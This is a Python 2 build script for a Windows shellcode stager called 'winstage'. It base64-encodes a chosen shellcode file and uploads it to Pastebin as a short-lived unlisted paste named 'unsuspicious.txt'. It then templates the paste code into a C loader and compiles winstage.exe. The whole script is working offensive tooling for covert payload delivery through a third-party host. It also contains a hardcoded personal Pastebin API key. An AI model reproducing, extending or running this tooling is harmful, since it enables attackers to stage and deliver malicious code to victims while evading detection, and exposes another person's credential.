#!/usr/bin/env python

import os
import subprocess
from jinja2 import Template
import urllib
import urllib2
import base64


def yesOrNo(prompt):
    """ A wrapped raw_input that expects a yes or no from the user """
    yes = set(['yes', 'y', 'ye'])
    no = set(['no', 'n', ''])
    # blank defaults to no

    while True:
        choice = raw_input(prompt).lower()

        if choice in yes:
            return True
        elif choice in no:
            return False
        else:
            print("Please respond with 'yes/y' or 'no/n'!")


def getFileName(prompt):
    """ A wrapped raw_input that expects the filename of a shell script """

    while True:
        filename = raw_input(prompt)
        try:
            with open(filename, 'rb') as f:
                f.read()
            return filename
        except IOError:
            print("That file doesn't seem to exist. Try again.")

###### BEGIN SCRIPT ######

basePath = os.path.dirname(os.path.abspath(__file__))

with open('winstage.c', 'rb') as f:
    rawCode = f.read()

template = Template(rawCode)

script = getFileName("Please enter the filename of the shellcode you would like to upload to Pastebin for future use (the file should be in this directory): ")
with open(script, 'rb') as f:
    upload = f.read()
    coded = base64.b64encode(upload)

# POST request parameters for the Pastebin API
values = {'api_dev_key': 'acf4072da13aa475dc724c4dab83bbd2',  # logan's API key
          'api_paste_code': coded,  # message body
          'api_paste_private': '1',  # 0 = public, 1 = unlisted, 2 = private
          'api_paste_name': 'unsuspicious.txt',  # filename
          'api_paste_expire_date': '10M',  # 10 minutes (#1W for 1 week)
          'api_paste_format': 'c',  # syntax highlighting says 'c file'
          'api_option': 'paste'  # tell pastebin it's a new paste
          }

# send a POST request to Pastebin
url = 'http://pastebin.com/api/api_post.php'
data = urllib.urlencode(values)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the_page = response.read()
print the_page

# get the URL code from Pastebin's response
pbCode = the_page[-8:]

errorHandling = yesOrNo("Would you like to include error handling? [y/N]: ")

renderedCode = template.render(pbCode=pbCode, errorHandling=errorHandling)

# TODO use tempfiles: https://docs.python.org/2/library/tempfile.html#module-tempfile
with open('winstage-generated.c', 'wb') as f:
    f.write(renderedCode)

subprocess.check_call(['make'])
filesize = os.path.getsize(os.path.join(basePath, "winstage.exe"))
print("Final file size is {} bytes.".format(filesize))
